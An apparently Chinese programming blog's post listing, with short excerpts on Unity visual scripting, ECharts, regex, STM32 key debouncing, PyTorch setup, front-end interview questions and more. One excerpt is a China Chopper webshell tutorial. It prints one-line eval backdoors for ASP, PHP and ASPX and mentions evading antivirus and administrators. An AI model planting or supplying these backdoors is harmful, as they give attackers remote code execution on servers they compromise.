<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa6f05b7e2a78e1e63f70592dbf14319/" rel="bookmark">
			Unity可视化编程Visual Scripting学习笔记6：自定义事件的定义和触发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实现按下A打印5次NiHao，，按下S打印5次XiuXi
创建自定义事件
自定义事件和事件一样，相当于一个起点，当指定对象上的指定名称事件被触发时会执行其链接的节点内容
触发自定义节点
触发自定义事件需要一个起点或流去触发指定对象上的指定名称事件
在这里按下A去触发对象自身的ShuoNiHao自定义事件
合理使用自定义事件可以使我们的脚本图条例更加清晰
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96c7af36700988744297dee958eabe86/" rel="bookmark">
			net stop/start mysql80 拒绝访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在电脑左下角输入cmd打开命令面板,在关闭数据库的前提下输入 net start mysql80,显示拒绝访问，访问错误。
原因可能是 cmd版本太低了，所以在打开cmd的时候，需要一些额外的操作。
具体操作如下：
在电脑左下角输入cmd，然后同时按住 shift+ctrl+enter就可以 以管理员的方式进入命令提示符界面。然后输入 net stop mysql80，就可以看到相应的提示。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f704d6c985ce10fbfef727be811223a3/" rel="bookmark">
			echarts隐藏坐标轴、刻度线、坐标值、网格 —— 全部隐藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前几天一个月薪35k的兄弟，给我推了一个人工智能学习网站，看了一段时间挺有意思的。包括语音识别、机器翻译等从基础到实战都有，很详细，分享给大家。大家及时保存，说不定啥时候就没了。
echarts隐藏坐标轴、刻度线、坐标值、网格 —— 全部隐藏 xAxis: { show:false, // 不显示坐标轴线、坐标轴刻度线和坐标轴上的文字 axisTick:{ show:false // 不显示坐标轴刻度线 }, axisLine: { show: false, // 不显示坐标轴线 }, axisLabel: { show: false, // 不显示坐标轴上的文字 }, splitLine:{ show:false // 不显示网格线 }, }, 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b21aea826b4eead40a2cff88110bdc4e/" rel="bookmark">
			正则表达式replace匹配点号.本身
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 正则表达式replace匹配点号.本身 前几天一个月薪35k的兄弟，给我推了一个人工智能学习网站，看了一段时间挺有意思的。包括语音识别、机器翻译等从基础到实战都有，很详细，分享给大家。大家及时保存，说不定啥时候就没了。
在正则表达式中，*、+、?等作为量词的字符具有特殊意义，但有些情况下只希望表示这些字符本身，此时就必须使用转义，也就是在它们之前添加反斜线\。
点号.是一个元字符，它可以匹配除换行符之外的任何字符，所以如果只想匹配点号本身，必须将它转义为\.
代码 let publishTime = '2021.10.23' let newTime = publishTime.replace(/\./g,'/') console.log(newTime) // 2021/10/23 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31e7313450bdb4b0b786d9ac8372242c/" rel="bookmark">
			ECharts3D地图(详细示例——附有具体注释)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ECharts3D地图(详细示例——附有具体注释) 推荐一个不错的学习资料库
3D地图图表效果如下: 代码 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;铜仁市3D地图(点击地图区域跳转到相应页面)&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-2.1.1.min.js"&gt;&lt;/script&gt; &lt;script src="js/echarts4.0.js"&gt;&lt;/script&gt; &lt;script src="js/echarts-gl.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 3D地图容器 --&gt; &lt;div id="main" style="width: 100%; height: 800px;"&gt;&lt;/div&gt; &lt;script&gt;	// 初始化图表	var myChart = echarts.init(document.getElementById('main')); // JSON文件(地图数据)路径 var uploadedDataURL = "json/522200.json"; // 显示加载动画效果,可以在加载数据前手动调用该接口显示加载动画，在数据加载完成后调用 hideLoading 隐藏加载动画。 myChart.showLoading(); // 引入JSON文件 $.getJSON(uploadedDataURL, function(geoJson) { // 注册地图名字(tongren)和数据(geoJson) echarts.registerMap('tongren', geoJson); // 隐藏动画加载效果。 myChart.hideLoading();	// 图表配置项	var option = { title : {	// 标题 top : '5%', text : '铜仁市3D地图', subtext : '', x : 'center', textStyle : { color : '#ccc' } }, tooltip : {	// 提示框 trigger : 'item', formatter : function(params) { return params.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31e7313450bdb4b0b786d9ac8372242c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16f6236a36ddb1b0f9fe43597dc472a5/" rel="bookmark">
			缓和曲线与原曲线任意点坐标计算程序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓和曲线与原曲线任意点坐标计算程序　Z=90S÷(R∏):U=S2÷(24R)-S^3÷(2688R^3):Q=S÷2-S^3÷(240R2):T=(R＋U)tan(N÷2)＋Q▲　L=R(N-2Z)∏÷180▲　Lbl0:{G}:K=Abs(G-F):S=0=＞Goto2: ≠＞Goto1⊿　Lbl1:K≤S=＞C=K-K^5÷(40R2S2) +K^9÷(3456R^4S^4):V=K^3÷(6RS)-K^7÷(336R^3S^3)+K^11÷(42240R^5S^5):O=tan-1(V÷C): Goto3: ≠＞Goto2⊿　Lbl2: O=180(K-S)÷(R∏)+Z:C=RsinO+Q:V=R(1-cosO)+U　Lbl3:Rec(C,B):X=D+I:Y=P+J: Rec(V,B):X=X+I:Y=Y+J▲　{H,W}:A=B+MO:ReC(H,A+90W):X=X+I▲Y=Y+J▲　Goto0　S：缓和段长度　R：圆曲线　∏：圆周率　T：缓和曲线切线长　N：缓和曲线偏角（输入绝对值）　L：圆曲线长　K：距离缓直点或圆起点距离　G：计算里程桩号F：缓直点（直缓点）或直圆点（圆直点）里程桩号　D：缓直点或圆起点X坐标P：缓直点（直缓点）或圆起点（圆终点）Y坐标　B：前切线方位角（计算缓直至圆缓或直圆至圆直用）或后切线方位角（计算直缓至缓圆或圆直至直圆用）　M：缓和曲线偏角方向控制（左输“　-1”　，右输“　1”　）（反向计算时相应反号）　X：计算点X值　Y：计算点Y值　H：边桩至中桩距离W：计算左边桩坐标时，输“　-1”　。　适用于计算：1、从缓直点至圆缓点或直缓点至缓圆点坐标　2、从直圆点至圆直点或圆直点至直圆点坐标，此时S=0。　本人编的4800计算器程序，有什么不到之处，恳请各位朋友给出宝贵的意见，本人一定予以改进。在此多谢各位！　本文来自：中国路桥网（www.9to.com），原文地址：http://www.9to.com/Article/Technique/daolu/200902/29227.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1578f5fbf3ecee859d552b55575d6cfa/" rel="bookmark">
			深度学习环境配置之windows下的torch-gpu=1.7.1（亲测有效）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 写在前面：一、Anaconda安装二、CUDA和Cudnn的下载和安装1、CUDA的下载和安装2、Cudnn的下载和安装 三、配置torch环境四、VSCODE的下载与安装 写在前面： 1.环境内容：win10、torch 1.7.1、torchvision 0.8.2、python 3.8、cuda10.1、cudnn7.6.5；
2.在安装CUDA之前，需要安装visual studio，我安装的是visual studio 2015，需要自取：
链接：https://pan.baidu.com/s/1iIG60keiIlDx9OteUGJaRg
提取码：cq8t
3.所有库安装完成后重启电脑。
一、Anaconda安装 直接去官网下载即可。
官网地址：https://www.anaconda.com/distribution/
有一个地方需要注意：
为了便于后面的配置，建议这里勾选Add Anaconda to my PATH environment variable，这样会自动将anaconda装到系统的环境变量中。
二、CUDA和Cudnn的下载和安装 1、CUDA的下载和安装 官网地址：https://developer.nvidia.com/cuda-10.1-download-archive-base?target_os=Windows&amp;target_arch=x86_64&amp;target_version=10&amp;target_type=exelocal
刚开始以为官网会比较慢，选择了网盘，但是由于文件比较大，下载速度超级慢，然后抱着试试的态度去了官网，速度还可以，还能接受。
下载完就会有这个文件：
双击进行安装
这里选择自定义：
建议c盘，当然安装在其它盘也是可以的（这里建议安装在C盘，是因为即使安装在其它盘,还是会有驱动文件写入C盘）。
到这里就安装完成了，安装完后在C盘这个位置找到根目录：
C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.1
注：安装时出现这种情况：
解决办法：关掉360等杀毒软件
2、Cudnn的下载和安装 网盘下载：
链接: https://pan.baidu.com/s/1pMNHxWrcjSU_UgLVxkk55g
提取码: xu9t
下载之后得到压缩包，进行解压，然后将里面的全部内容直接复制到C盘的根目录下：
三、配置torch环境 写在前面：
这里一定要使用 anaconda prompt ， 切记，不要在默认的cmd中运行命令。
1、首先, 创建一个名为pytorch的环境，该环境的python版本为3.8
由于所有的操作都要在对应环境中进行，所以在进行库的安装前需要先激活环境：
2.pytorch库的安装：
官方安装方法：
pip install torch1.7.1+cu101 torchvision0.8.2+cu101 torchaudio==0.7.2 -f https://download.pytorch.org/whl/torch_stable.html
其他依赖库的安装：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1578f5fbf3ecee859d552b55575d6cfa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81883fb260a458b27584c499b338d524/" rel="bookmark">
			【stm32单片机基础】按键状态机实现长按和短按
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【stm32单片机基础】按键状态机 文章目录 【stm32单片机基础】按键状态机前言一、按键的消抖二、按键状态机实现0.状态机模式1.单个按键检测2.单个按键实现长按和短按 三、长按和短按测试示例四 、多按键检测按键处理经典例程：总结 前言 在单片机的教学例程中，常使用delay延迟的方式消除按键抖动，而delay延迟的方式使CPU处于空等的状态，不能进行其他任务，直到结束delay延时函数，这种阻塞的方式不利于多任务的情形。本文将使用非阻塞的方式消抖，并采用状态机的模式编写按键处理函数。 一、按键的消抖 按键消抖：通常的按键所用开关为机械弹性开关，当机械触点断开、闭合时，由于机械触点的弹性作用，一个按键开关在闭合时不会马上稳定地接通，在断开时也不会一下子断开，因而在闭合及断开的瞬间均伴随有一连串的抖动，按键抖动会引起一次按键被误读多次。
抖动时间的长短由按键的机械特性决定，一般为5ms～10ms。
软件消抖：硬件方法将导致系统硬件电路设计复杂化，常采用软件方法进行消抖。
软件方法去抖，即检测出键闭合后执行一个延时程序，5ms～10ms的延时，让前沿抖动消失后再一次检测键的状态，如果仍保持闭合状态电平，则确认为真正有键按下。
二、按键状态机实现 0.状态机模式 简单理解为：将一个事件划分为有限个状态，满足相应的条件，在有限个状态之间跳转；可以使用状态图来描述事件处理过程，这种方式使得程序逻辑思路更加清晰严谨。以按键为例，按键检测的过程可以分为三个状态：按键检测状态、按键确认状态、按键释放状态；而在这三个状态之间跳转的条件为当前状态下按键的值。
在单片机中实现状态机最常用的语句便是switch case语句。
【状态机中如何非阻塞消抖】：使用定时器中断，定时每10ms执行一次switch case语句，即两个状态之间跳转的时间为10ms，这样便代替了delay延时。当定时中断发生时，才跳转到中断服务函数执行。
1.单个按键检测 独立按键电路
单个按键的状态转移图如下：
S1状态为按键检测，S2为按键确认，S3为释放按键；状态跳转条件为当前状态下读取到的按键高低电平Key，当Result为1时，表示按键已经成功按下。
单个按键检测的代码实现：
#ifdef SingleKeyEvent typedef enum { KEY_CHECK = 0, KEY_COMFIRM = 1, KEY_RELEASE = 2 }KEY_STATE; KEY_STATE KeyState =KEY_CHECK; // 初始化按键状态为检测状态 u8 g_KeyFlag = 0; // 按键有效标志，0： 按键值无效； 1：按键值有效 /** * 单个按键检测事件 * 功能：使用状态机方式，扫描单个按键；扫描周期为10ms,10ms刚好跳过抖动； * 状态机使用switch case语句实现状态之间的跳转 * */ void Key_Scan(void) { switch (KeyState) { //按键未按下状态，此时判断Key的值 case KEY_CHECK: if(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81883fb260a458b27584c499b338d524/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b028642baecdc453e5c19338d763f9ea/" rel="bookmark">
			夜神模拟器无法连接网络的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们经常会在电脑上安装安卓模拟器来玩一些手机游戏或者运行手机软件，但是有时候可能由于网络不好等原因导致模拟器连接不上网络。比如夜神模拟器无法连接网络怎么办？下面就来看看解决的办法。
夜神模拟器无法连接网络怎么办：
1、同时按下“win+R”，打开运行。
2、在运行窗口中，输入：cmd，打开管理员窗口。
3、输入命令：ipconfig/flushdns，然后按下回车键，然后重启模拟器。
4、如果不行。再次打开管理员界面，输入命令：netsh winsock reset，然后重启电脑，即可解决。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/374a6212bfe400f16661ea3f6e2505f8/" rel="bookmark">
			java基础-swing图形化界面学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.概述
java中的gui包主要是awt和swing,awt是重量级组件，不支持跨平台。swing是轻量级组件，基于java本身，是可以跨平台的。
2.创建一个简单的图形窗口
public static void main(String[] args) { JFrame jFrame = new JFrame("测试图形界面程序"); //设置窗口的大小 jFrame.setSize(400, 400); //设置距离屏幕左上角的距离 jFrame.setLocation(800, 300); jFrame.setVisible(true); } 示例
3.swing组件
按钮：java基础-swing图形界面-按钮_LouD_dm的博客-CSDN博客
单选按钮：
复选框：
组合框：
列表：
文本框：
面板：
表格：
框架：
4.swing布局管理器
流式布局管理器：
卡片布局管理器：
网格布局管理器：
5.swing事件处理
6.swing图形处理和2d
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f6d6023af581ec9539a2634bf80495f/" rel="bookmark">
			中国菜刀使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 先下载软件，找不到在哪儿下载的可以找我
1、下载该软件，解压之后双击.exe，打开之后就可以直接使用了
2、前边填shell地址，然后后边的小空填口令，也就是密码
3、然后选择脚本类型，然后添加
4、添加完后，会有一条数据，然后右键点击，选择文件管理，就可以完成了
服务端只需要简单的一行代码，即可用此程序实现常用的管理功能。支持的服务端脚本：PHP, ASP，NET。从最基本的说起，你的脚本是不是经常被杀，你怎么变形都被杀，，传到服务器被杀导致被管理员发现，结果你的权限就没了，杀到你欲哭无泪。
菜刀的一句话后门： Asp环境：&lt;%eval request("a")%&gt; Php环境：&lt;?php @eval($_POST['a']);?&gt; Aspx环境：&lt;% @page Language="Jscript"&gt;&lt;%eval(Request.item["a"],"unsafe");%&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbd08eef43f298852f451fbfbb34d4f3/" rel="bookmark">
			js中把数字转换成汉字输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 在js中把数字转换成汉字输出的方法，直接可以拿来用 方法一：支持7位，也就是最大1234567 案例：this.toChinesNum(10101010) 得到 "一千零一十万一千零一十" /** * 数字转成汉字 * @params num === 要转换的数字 * @return 汉字 * */ toChinesNum(num) { let changeNum = ['零', '一', '二', '三', '四', '五', '六', '七', '八', '九'] let unit = ['', '十', '百', '千', '万'] num = parseInt(num) let getWan = (temp) =&gt; { let strArr = temp.toString().split('').reverse() let newNum = '' let newArr = [] strArr.forEach((item, index) =&gt; { newArr.unshift(item === '0' ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbd08eef43f298852f451fbfbb34d4f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f844a445abf1a82a46da8c3ba68d9589/" rel="bookmark">
			goJS-绘图-控制显示内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		goJs是国外画图的一个包，同比阿里的antv/x6
中文文档
字段是否显示
参考: Decorated Content 一节 { toolTip: $(go.Adornment, "Auto", $(go.Shape, { fill: "#FFFFCC" }, new go.Binding("visible", "info", function(i) { return i ? true : false; })), $(go.TextBlock, { margin: 4 }, new go.Binding("text", "info")) ) } // 主要是 visible 这个属性的设置，根据外部传入的字段来控制这行显示与否，从而可以根据业务场景来显示不同的字段。 还有控制opacity属性，详情参考该章节实例。
分发模板显示
根据不同的category值来进入不同模板，显示不同的信息。比如list和detail的显示。 ... let xxxtemplate = ... var templmap = new go.Map(); templmap.add("simple", simpletemplate); templmap.add("detailed", detailtemplate); templmap.add("", diagram.nodeTemplate); diagram.nodeTemplateMap = templmap; ... 外部数据
nodeDataArray = [ .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f844a445abf1a82a46da8c3ba68d9589/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33530b772179fb84e50920c7c5b1e290/" rel="bookmark">
			前端面试常问的题目（持续更新中）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、闭包问题
什么是闭包？答：“闭包就是能够读取其他函数内部变量的函数
造成闭包的原因？答：
解决方法？答：可以使用let、立即执行函数
闭包可以实现什么？可以访问局部变量、可以保护变量不受污染
2、ajax、axios 前后端通信的过程（原生的ajax怎么写）
原生ajax请求步骤get：
1.创建核心的对象（new xhrhttprequest对象）
2.编写回调函数（判断是否请求成功 状态码等于4或者等于200）
3.调用open方法 设置请求方式和请求路径
4.调用send方法 发送
post：要多设置一个请求头setrequestheader（在发送的前面）
3、跨域问题（具体实现）
答：跨域解决方式：
1.jsonp（script这个标签本来就有跨域的能力，然后将ajax中datatype中类型改为jsonp）缺点只支持get
2.利用cors设置头 允许跨域（头有哪些）优点：支持get和post两种
使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理
3.利用proxy代理（具体实现不管是否跨域，在自己服务器上中转一次，让它允许跨域，类似于一个中转站的意思）
4、浏览器的渲染流程
这个问题应该就是输入url到页面呈现问题的变种，只不过此时的侧重点是获取完数据之后进行的渲染流程。
根据李兵老师的浏览器工作原理一节做如下回答：
第一步，HTML转换成DOM
第二步，CSS转换成浏览器可理解的styleSheets，然后计算DOM节点的样式
第三步，创建布居树，计算元素的布局信息
第四步，对布居树进行分层，构建分层树
第五步，为每个图层生产绘制列表，并将其提交到合成线程
第六步，合成线程将图层转化为图块，进而将图块转化成位图
第七步，合成线程发送绘制命令给浏览器
第八步，浏览器根据绘制命令生成页面，并显示到显示器上。
5、deffer和async的区别
浏览器脚本，在普通的情况下，是会依次执行。但是我们可以用deffer和async关键字来让脚本异步执行。
但是，deffer是按照加载顺序执行DOMContentLoaded之前执行，但是async则是脚本加载完毕之后立即执行（不考虑依赖以及DOM的加载状态），一般来说，deffer要比async好一点。
6、map和forEach的区别
forEach返回undefined，map会返回新的数组。
forEach没办法中止循环，但是map可以通过返回false或者出错来中止。
7、call、apply以及bind的区别。
三者都是改变this执行，不同的是，call和apply是直接生成了函数调用，而bind则是返回了一个函数，你需要再次执行才会达到相同的效果。
call和apply又是因为参数的传递方式不一样，apply传递的是数组，call传递的单个参数的陈列。
bind则是以函数调用参数的方式传递参数。
8、事件循环。
JavaScript是单线程执行模型，执行的时候将会区分为主线程和任务队列。主线程执行完毕，会从任务队列中读取新的任务放入主线程进行执行，这个读取过程是循环读取，所以也叫事件循环。
任务队列分为宏任务和微任务，同层次，先执行微任务，再执行宏任务。
微任务：promise.then()、process.nextTick()
宏任务：setTimeOut()、setInterval()
9、get和post请求区别
GET在浏览器回退时是无害的，而POST会再次提交请求。
GET产生的URL地址可以被Bookmark，而POST不可以。
GET请求会被浏览器主动cache，而POST不会，除非手动设置。
GET请求只能进行url编码，而POST支持多种编码方式。
GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
GET请求在URL中传送的参数是有长度限制的，而POST么有。
对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
GET参数通过URL传递，POST放在Request body中。
GET产生一个TCP数据包；POST产生两个TCP数据包。
GET与POST都有自己的语义，不能随便混用。
10、双向绑定原理
vue数据双向绑定是通过数据劫持结合发布者-订阅者模式的方式来实现的
我们已经知道实现数据的双向绑定，首先要对数据进行劫持监听，所以我们需要设置一个监听器Observer，用来监听所有属性。如果属性发上变化了，就需要告诉订阅者Watcher看是否需要更新。因为订阅者是有很多个，所以我们需要有一个消息订阅器Dep来专门收集这些订阅者，然后在监听器Observer和订阅者Watcher之间进行统一管理的。接着，我们还需要有一个指令解析器Compile，对每个节点元素进行扫描和解析，将相关指令（如v-model，v-on）对应初始化成一个订阅者Watcher，并替换模板数据或者绑定相应的函数，此时当订阅者Watcher接收到相应属性的变化，就会执行对应的更新函数，从而更新视图。
11、Async和Await原理
async、await从字面上理解，async就是异步的意思，await就是等待的意思，而两者的用法上也是这样的，async用于申明一个function是异步的，而await用于等待一个异步方法执行完成
过程就是：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33530b772179fb84e50920c7c5b1e290/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d807c95736eb42f59a0b0eac15e596c1/" rel="bookmark">
			vue-cli3 &#43; lib-flexible 实现响应式布局 &#43;分辨率宽高缩放锁定布局
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、使用安装 lib-flexible，实现浏览器分辨率网页适配。
lib-flexible，根据设备dpr和宽度，利用viewport和html根元素的font-size配合rem来适配不同尺寸，npm安装：
npm install lib-flexible 2、在src目录下增加一个utils目录，新建一个js文件，名称rem.js，目的是省略rem的计算，加快开发速度。复制以下内容：
// 基准大小 const baseSize = 32 // 设置 rem 函数 function setRem () { // 当前页面宽度相对于 750 宽的缩放比例，可根据自己需要修改。 const scale = document.documentElement.clientWidth / 1920 // 设置页面根节点字体大小 document.documentElement.style.fontSize = (baseSize * Math.min(scale, 2)) + 'px' } // 初始化 setRem() // 改变窗口大小时重新设置 rem window.onresize = function () { setRem() } 在main.js中引入改js文件：
import "./utils/rem" 这样可以直接用px写模块，而不用去计算rem的值，是不是很舒服呢，重点我采用加粗处理啦。
3、使用安装VW。了解下vw 与 vh单位，以viewport为基准，1vw 与 1vh分别为window.innerWidth 与 window.innerHeight的百分之一
npm i postcss-px-to-viewport -save -dev 我们在项目的package.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d807c95736eb42f59a0b0eac15e596c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1db73820175c0ced4f6670640b92df23/" rel="bookmark">
			UVM中uvm_config_db在sequence中的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在UVM中使用get_full_name()可以得到一个component的完整路径，同样的，此函数也可以在一个sequence中被调用，尝试在一个sequence的body中调用此函数，并打印出返回值，其结果大体如下：
uvm_test_top.env.i_agt.sqr.case0_sequence
这个路径是由两个部分组成，此sequence的sequencer的路径，即实例化此sequence时传递的名字。
在sequence中get参数 //my_case0.sv
function void my_case0::build_phase(uvm_phase phase); ... uvm_config_db#(int)::set(this, "env.i_agt.sqr.*", "count", 9); ... endfunction set函数的第二个路径参数里面出现了通配符，这是因为sequence在实例化名字一般是不固定的，而且有时是未知的，所以使用通配符。
在sequence中以如下方式调用config_db::get函数。
//my_case0.sv
class case0_sequence extends uvm_sequence#(my_transaction); ... virtual task per_body(); if(uvm_config_db#(int)::get(null, get_full_name(), "count", count) `uvm_info("seq0", $sformatf("get count value %0d via config_db", count), UVM_MEDIUM) else `uvm_error("seq0", "cannot get count value!") endtask ... endclass 在get函数原型中，第一个参数必须是一个component，而sequence不是一个component，所以这里不能使用this指针，只能使用null或uvm_root::get()。前面已经提到过，当使用null是，UVM会自动将其替换为uvm_root:get()，再加上第二个参数get_full_name(), 就可以完整地得到此sequence的路径，从而得到参数。
在sequence中set参数 //my_case0.sv
class drv0_seq extends uvm_sequnece #(my_transaction); ... virtual task body(); void'(uvm_config_db#(bit)::get(uvm_root::get(), get_full_name(), "first_start", first_start)); if(first_start) `uvm_info("drv0_seq", "this is the first start of the sequence"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1db73820175c0ced4f6670640b92df23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b7baa6ccec956ae12534a079a21e74e/" rel="bookmark">
			数据结构-合并链表算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据结构算法题 将两个递增的有序链表合并为一个递增的有序链表。要求结果链表仍使用原来两个链表的存储空间, 不另外占用其它的存储空间。表中不允许有重复的数据。 int MergeList(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc){//两个递增链表合并为一个递增链表,用原有的空间，不能有重复的数据 LinkList pa,pb,pc,u; pa=La-&gt;next; pb=Lb-&gt;next; Lc=pc=La;//用La作Lc的头节点 while(pa&amp;&amp;pb){ if(pa-&gt;data&lt;pb-&gt;data){//比较较小的节点插入Lc中 pc-&gt;next=pa; pc=pa; pa=pa-&gt;next; } else if(pa-&gt;data&gt;pb-&gt;data){ pc-&gt;next=pb; pc=pb; pb=pb-&gt;next; } else{//有相同节点时选择其中一个链入Lc中，另一个则释放掉 pc-&gt;next=pa; pc=pa; pa=pa-&gt;next; u=pb-&gt;next; free(pb); pb=u; } } pc-&gt;next=pa?pa:pb; return OK; } 2.将两个非递减的有序链表合并为一个非递增的有序链表。要求结果链表仍使用原来两个链表的存储空间, 不另外占用其它的存储空间。表中允许有重复的数据。
int Union(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc){//两个递增链表合并为一个递减的链表,用原有的空间，可有重复的数据（用头插法，完成逆序） LinkList pa,pb,p; pa=La-&gt;next; pb=Lb-&gt;next; Lc=La; Lc-&gt;next=NULL; while(pa||pb){ if(!pa){ p=pb; pb=pb-&gt;next; } else if(!pb){ p=pa; pa=pa-&gt;next; } else if(pa-&gt;data&lt;=pb-&gt;data){ p=pa; pa=pa-&gt;next; } else{ p=pb; pb=pb-&gt;next; } p-&gt;next=Lc-&gt;next; Lc-&gt;next=p;//插入 } } 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b7baa6ccec956ae12534a079a21e74e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b337edb9014e82a50d18e4794f93d59a/" rel="bookmark">
			LeetCode-1979. 找出数组的最大公约数_Python
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给你一个整数数组 nums ，返回数组中最大数和最小数的最大公约数。
两个数的最大公约数是能够被两个数整除的最大正整数。
示例 1： 输入：nums = [2,5,6,9,10]
输出：2
解释：
nums 中最小的数是 2
nums 中最大的数是 10
2 和 10 的最大公约数是 2
示例 2： 输入：nums = [7,5,6,8,3]
输出：1
解释：
nums 中最小的数是 3
nums 中最大的数是 8
3 和 8 的最大公约数是 1
示例 3： 输入：nums = [3,3]
输出：3
解释：
nums 中最小的数是 3
nums 中最大的数是 3
3 和 3 的最大公约数是 3
提示： 2 &lt;= nums.length &lt;= 1000
1 &lt;= nums[i] &lt;= 1000
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b337edb9014e82a50d18e4794f93d59a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37bdcc597dd51e73b1308319a1fcca78/" rel="bookmark">
			工具及方法 - 在Source Insight中使用代码格式化工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Source Insight 4.0中，有代码格式化工具：
当你打开某个源文件后，可以对当前文件进行格式修改：
